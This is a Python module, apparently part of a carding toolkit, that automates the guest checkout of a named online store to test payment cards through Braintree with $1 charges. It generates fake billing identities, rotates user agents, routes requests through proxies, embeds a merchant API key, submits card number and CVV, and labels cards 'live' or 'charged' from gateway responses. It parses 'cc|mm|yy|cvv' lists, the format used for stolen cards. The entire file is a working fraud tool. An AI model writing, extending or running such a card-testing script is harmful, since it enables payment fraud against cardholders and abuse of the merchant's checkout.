"""Braintree $1 gate — vitabase.com headless checkout."""
from __future__ import annotations

import base64
import json
import random
import re
import string
import time
import uuid
import asyncio
import aiohttp

from aiohttp_socks import ProxyConnector

from helpers import classify_gate_response

HTTP_TIMEOUT = aiohttp.ClientTimeout(total=25, connect=10)

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
]

PRODUCT_ID = 3298960
API_KEY = "d8761e2127e9a3342797abf0558b3569bb35d3f8836b9c80485ba250ee3aa744"

FIRST_NAMES = [
    "James", "John", "Robert", "Michael", "William", "David", "Richard",
    "Joseph", "Thomas", "Charles", "Emily", "Emma", "Olivia", "Ava",
]
LAST_NAMES = [
    "Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller",
    "Davis", "Wilson", "Taylor", "Anderson", "Thomas", "Jackson", "White",
]
STREETS = [
    "Main St", "Oak Ave", "Maple Dr", "Cedar Ln", "Pine Rd", "Elm St",
]
CITIES_STATES = [
    ("Phoenix", "AZ", "850"),
    ("Los Angeles", "CA", "900"),
    ("Houston", "TX", "770"),
    ("Chicago", "IL", "606"),
    ("Dallas", "TX", "752"),
]


def _clean_msg(msg: str, limit: int = 120) -> str:
    s = re.sub(r"<[^>]+>", " ", str(msg or ""))
    s = re.sub(r"\s+", " ", s).strip()
    if "{" in s:
        s = s.split("{", 1)[0].strip()
    return (s[:limit] if s else "Declined")


def _rand_billing() -> tuple[dict, dict]:
    first = random.choice(FIRST_NAMES)
    last = random.choice(LAST_NAMES)
    email = "".join(random.choices(string.ascii_lowercase + string.digits, k=10)) + "@gmail.com"
    address = f"{random.randint(100, 99999)} {random.choice(STREETS)}"
    city, state, zip_prefix = random.choice(CITIES_STATES)
    postcode = zip_prefix + str(random.randint(10, 99))
    phone = "+1" + "".join(random.choices(string.digits, k=10))
    billing = {
        "first_name": first,
        "last_name": last,
        "company": "",
        "address_1": address,
        "address_2": "",
        "city": city,
        "state": state,
        "postcode": postcode,
        "country": "US",
        "email": email,
        "phone": phone,
    }
    shipping = {k: v for k, v in billing.items() if k not in ("email", "phone")}
    return billing, shipping


def _classify_checkout(result: dict | None, http_status: int) -> tuple[str, str, str]:
    if http_status >= 500:
        return "error", f"Upstream Server Error (HTTP {http_status})", "upstream_5xx"
    if not isinstance(result, dict):
        return "declined", "Invalid Checkout Response", "declined"

    if result.get("error") == "timeout":
        return "error", "Checkout Request Timeout", "timeout"

    order = result.get("order") if isinstance(result.get("order"), dict) else {}
    if (
        result.get("success") is True
        or result.get("status") in ("success", "completed", "processing", "paid")
        or result.get("order_id")
        or order.get("id")
        or result.get("payment_status") in ("paid", "completed", "success")
    ):
        oid = str(result.get("order_id") or order.get("id") or "")
        display = f"Order Completed / Charged $1.00 ({oid})" if oid else "Order Completed / Charged $1.00"
        return "charged", display, "charged"

    # Extract exact server error message
    err = result.get("error")
    if isinstance(err, dict):
        err_msg = str(err.get("message") or err.get("description") or err.get("code") or "")
    else:
        err_msg = str(err or "")

    server_msg = str(result.get("error_message") or result.get("message") or result.get("msg") or err_msg or "").strip()
    server_code = str(result.get("error_code") or result.get("code") or "declined").strip()
    
    blob = json.dumps(result, default=str)
    combined = f"{server_msg} {server_code} {blob}".lower()

    # ── Comprehensive Response Taxonomy ──────────────────────────────────────
    if any(k in combined for k in ("captcha", "recaptcha")):
        return "error", "reCAPTCHA Required", "captcha_required"

    if any(k in combined for k in ("insufficient", "insufficient_funds", "2001", "not enough fund", "exceeds balance")):
        return "live", "Insufficient Funds", "insufficient_funds"

    if any(k in combined for k in ("security code", "incorrect_cvc", "invalid_cvc", "cvv mismatch", "cvc mismatch", "2004", "2010", "declined cvv")):
        return "live", "Security code is incorrect (CCN Live)", "incorrect_cvc"

    if any(k in combined for k in ("avs", "avs_and_cvv", "address verification")):
        return "live", "AVS Mismatch (Card Live)", "avs_rejected"

    if any(k in combined for k in ("fraud", "fraudulent", "risk_threshold", "suspected fraud", "gateway rejected: fraud")):
        return "declined", "Gateway Rejected: Fraud", "fraud"

    if any(k in combined for k in ("3ds", "3d secure", "requires_action", "authentication required", "challenge_required")):
        return "3ds", "3D Secure / Verification Required", "3ds_required"

    if any(k in combined for k in ("do not honor", "do_not_honor", "2005", "2000")):
        return "declined", "Do Not Honor", "do_not_honor"

    if any(k in combined for k in ("expired", "expired_card", "2002")):
        return "declined", "Expired Card", "expired_card"

    if any(k in combined for k in ("pickup", "pick up", "lost card", "stolen", "2003")):
        return "declined", "Lost or Stolen Card (Pickup)", "lost_card"

    # Shorten generic e-commerce boilerplate copy
    if "please check your card details" in server_msg.lower() or server_msg.lower().startswith("payment declined"):
        return "declined", "Payment declined.", "payment_declined"

    if server_msg:
        return "declined", _clean_msg(server_msg), server_code

    return "declined", "Payment declined.", "declined"


async def check_card(
    cc: str,
    mm: str,
    yy: str,
    cvv: str,
    proxy_url: str | None = None,
) -> tuple[str, str, str]:
    """
    Returns (status, message, code).
    status: charged | approved | declined | error
    """
    if len(yy) == 2:
        yy = "20" + yy[-2:]
    mm = mm.zfill(2)

    def _format_proxy(p):
        if not p: return None
        ps = str(p).strip()
        formatted = None
        if ps.startswith(("http://", "https://", "socks5://", "socks4://")):
            formatted = ps
        else:
            parts = ps.split(":")
            if len(parts) == 4:
                if parts[1].isdigit(): formatted = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
                elif parts[3].isdigit(): formatted = f"http://{parts[0]}:{parts[1]}@{parts[2]}:{parts[3]}"
                else: formatted = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
            elif len(parts) == 2: formatted = f"http://{parts[0]}:{parts[1]}"
            else: formatted = f"http://{ps}"

        if formatted.startswith("socks5://"):
            formatted = formatted.replace("socks5://", "socks5h://")
        elif formatted.startswith("socks4://"):
            formatted = formatted.replace("socks4://", "socks4a://")

        return formatted

    formatted_proxy = _format_proxy(proxy_url)
    user_agent = random.choice(USER_AGENTS)
    billing, shipping = _rand_billing()

    try:
        if formatted_proxy:
            connector = ProxyConnector.from_url(formatted_proxy, ssl=False)
        else:
            connector = aiohttp.TCPConnector(ssl=False)

        async with aiohttp.ClientSession(
            connector=connector,
            timeout=HTTP_TIMEOUT
        ) as session:
            
            headers = {
                "user-agent": user_agent,
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "accept-language": "en-US,en;q=0.9",
            }
            async with session.get(
                "https://vitabase.com/product/digestive-enzyme",
                headers=headers,
            ) as r1:
                if r1.status != 200:
                    return "error", f"init_http_{r1.status}", "connection_error"
                await r1.read()

            api_headers = {
                "accept": "application/json",
                "content-type": "application/json",
                "origin": "https://vitabase.com",
                "referer": "https://vitabase.com/product/digestive-enzyme",
                "user-agent": user_agent,
                "x-api-key": API_KEY,
            }
            cart_token = None
            for attempt in range(2):
                try:
                    async with session.post(
                        "https://vitabase.com/headless-api/cart/create",
                        headers=api_headers,
                        json={"user_id": "guest"},
                    ) as create_resp:
                        try:
                            create_data = await create_resp.json()
                        except:
                            create_data = {}
                        cart_token = create_data.get("cart_token") or (create_data.get("data") or {}).get("cart_token")
                        if cart_token:
                            break
                except Exception:
                    pass

            if not cart_token:
                return "error", "Merchant Cart API Unavailable", "cart_fail"

            async with session.post(
                "https://vitabase.com/headless-api/cart/add",
                headers=api_headers,
                json={
                    "cart_token": cart_token,
                    "product_id": PRODUCT_ID,
                    "quantity": 1,
                    "user_id": "guest",
                    "autoship_flag": False,
                },
            ) as add_resp:
                if add_resp.status not in (200, 201):
                    return "error", f"cart_add_{add_resp.status}", "cart_fail"
                await add_resp.read()

            client_token = None
            bt_data = {}
            for attempt in range(2):
                try:
                    async with session.get(
                        "https://vitabase.com/headless-api/braintree/client-token",
                        headers=api_headers,
                    ) as bt_resp:
                        if bt_resp.status == 200:
                            try:
                                bt_data = await bt_resp.json()
                            except:
                                bt_data = {}
                            client_token = bt_data.get("client_token")
                            if client_token:
                                break
                except Exception:
                    pass

            if not client_token:
                return "error", "Merchant Tokenization Unavailable", "bt_token_fail"
            if bt_data.get("require_captcha"):
                return "error", "recaptcha_required", "captcha_required"

            try:
                decoded = json.loads(base64.b64decode(client_token))
                auth_fingerprint = decoded.get("authorizationFingerprint")
            except Exception as e:
                return "error", f"bt_decode_fail: {e}", "bt_token_fail"
            if not auth_fingerprint:
                return "error", "no_auth_fingerprint", "bt_token_fail"

            gql_headers = {
                "accept": "*/*",
                "authorization": f"Bearer {auth_fingerprint}",
                "braintree-version": "2018-05-10",
                "content-type": "application/json",
                "origin": "https://assets.braintreegateway.com",
                "referer": "https://assets.braintreegateway.com/",
                "user-agent": user_agent,
            }
            gql_payload = {
                "clientSdkMetadata": {
                    "source": "client",
                    "integration": "custom",
                    "sessionId": str(uuid.uuid4()),
                },
                "query": (
                    "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) "
                    "{ tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 } } }"
                ),
                "variables": {
                    "input": {
                        "creditCard": {
                            "number": cc,
                            "expirationMonth": mm,
                            "expirationYear": yy,
                            "cvv": cvv,
                        },
                        "options": {"validate": False},
                    },
                },
                "operationName": "TokenizeCreditCard",
            }
            
            async with session.post(
                "https://payments.braintree-api.com/graphql",
                headers=gql_headers,
                json=gql_payload,
            ) as gql_resp:
                try:
                    gql_json = await gql_resp.json()
                except:
                    gql_json = {}
            
            payment_nonce = (gql_json.get("data") or {}).get("tokenizeCreditCard", {}).get("token")
            if not payment_nonce:
                err_blob = json.dumps(gql_json, default=str)
                st, msg, code = classify_gate_response(err_blob)
                return st, _clean_msg(msg or "tokenize failed"), code

            checkout_headers = {
                "accept": "application/json",
                "content-type": "application/json",
                "origin": "https://checkout.vitabase.com",
                "referer": "https://checkout.vitabase.com/",
                "user-agent": user_agent,
                "x-api-key": API_KEY,
            }
            checkout_payload = {
                "cart_token": cart_token,
                "payment_method": "braintree_cc",
                "shipping_method": "free_shipping",
                "shipping_method_id": "free_shipping",
                "shipping_method_title": "Free Shipping",
                "shipping_total": "0",
                "billing": billing,
                "shipping": shipping,
                "ship_to_different_address": 0,
                "line_items": [{"product_id": PRODUCT_ID, "quantity": 1, "autoship_flag": False}],
                "payment_nonce": payment_nonce,
            }
            
            async with session.post(
                "https://vitabase.com/headless-api/checkout",
                headers=checkout_headers,
                json=checkout_payload,
            ) as co_resp:
                try:
                    co_json = await co_resp.json()
                except:
                    co_text = await co_resp.text()
                    co_json = {"message": co_text[:200]}

            status, msg, code = _classify_checkout(co_json, co_resp.status)
            return status, msg, code

    except asyncio.TimeoutError:
        return "error", "timeout", "timeout"
    except aiohttp.ClientError as e:
        low = str(e).lower()
        if "proxy" in low or "tunnel" in low or "connect" in low:
            return "error", str(e)[:120], "proxy_error"
        return "error", str(e)[:120], "connection_error"
    except Exception as e:
        return "error", str(e)[:120], "exception"


async def check_card_str(cc_str: str, proxy_url: str | None = None) -> tuple[str, str, str]:
    parts = cc_str.replace("/", "|").split("|")
    if len(parts) < 4:
        return "error", "invalid_cc_format", "bad_format"
    return await check_card(parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip(), proxy_url)
